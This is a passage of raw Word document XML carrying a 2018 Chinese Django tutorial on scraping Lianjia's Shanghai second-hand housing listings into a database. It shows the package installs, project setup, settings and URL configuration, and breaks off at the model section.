    <w:p w14:paraId="4038975A" w14:textId="604FC91B" w:rsidR="001C47AF" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">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091</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId332" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django实战: Python爬取链家上海二手房信息，存入数据库并在前端显示</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7A869E22" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django实战: Python爬取链家上海二手房信息，存入数据库并在前端显示</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="196D7198" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId333" w:history="1">
        <w:r w:rsidRPr="003802BB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-11-07</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16AB95C9" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9DF106"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Django实战</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79344513" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>好久没写Django实战教程了，小编我今天就带你把它与Python爬虫结合做出个有趣的东西吧。我们将开发这样一个应用，前端用户可以根据行政区划，房厅数和价格区间选择需要爬取的二手房房源信息，后台Python开始爬取数据。爬取数据完成后，通过Django将爬来的数据存入数据库并通过网页显示给用户。通过本文，你将学会:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654AD832" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django如何与Python爬虫结合与交互</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E83F63E" w14:textId="45973B4E" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如何利用split方法和正则表达式从字符串中提取我们所需要信息</w:t>
      </w:r>
      <w:r w:rsidR="004300AE">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>：图略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8B05AA" w14:textId="02D773D9" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F65518E" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>开发环境</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CF685BD" w14:textId="478A7B06" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68754C45" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用venv或PyCharm新建一个项目，安装本项目所需要的python第三方库。后面3个库都是python爬虫常用的库。我们将使用Django 2.1 + Python 3.X + SQLite开发。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76FBDE23" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pip install django</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3785D435" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pip install bs4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242AD9E2" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pip install requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF58AC5" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>pip install fake-useragent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D96EF9" w14:textId="24B47FE8" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28832445" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>新建项目与项目设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A132E6D" w14:textId="5FEDE3B6" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CE8F0C0" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用django-admin startproject home_spider创建一个名为home_spider的django项目, 然后cd home_spider进入项目文件夹，使用python manage.py startapp homelink创建一个名为homelink的APP，让后把它加入到settings.py的INSTALLED_APP里去。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F68D7D4" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#home_spider/settings.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E9CEFD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>INSTALLED_APPS = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C29816D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.admin',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E72DDBD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.auth',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29525696" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.contenttypes',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D3235C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.sessions',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF5CC25" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.messages',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567757AA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'django.contrib.staticfiles',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106FD3D6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    'homelink',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242CD74E" w14:textId="3B6AEF6C" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="674C8567" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DA6B7DA" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>因为美化我们的网需要用到静态文件如css和js，我们需要在settings.py里设置STATIC_URL。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020DDED3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>STATIC_URL = '/static/'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F614A0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>STATICFILES_DIRS = [os.path.join(BASE_DIR, "static"), ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE81490" w14:textId="6929E9AA" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0569C796" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>除此以外我们还要把app的urls加到项目里去, 如下所示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461A6EED" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#home_spider/urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F5DD68" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.conf import settings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7248A4DC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.conf.urls.static import static</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0344954F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7778B651" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65050A94" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('admin/', admin.site.urls),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AFEDCCF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('accounts/', include('allauth.urls')),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07328343" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    path('homelink/', include('homelink.urls')),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F1E6517" w14:textId="0E69AD85" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">] </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C19323E" w14:textId="37E260CE" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DA95D58" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656EFD97" w14:textId="1818A07B" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E03772C" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们的模型非常简单，主要用于存储二手房相关信息，如小区，房厅，朝向，总价和单价。模型的各个字段与我们即将从链家网上爬取的信息是逐一对应的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15FFD3B7" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
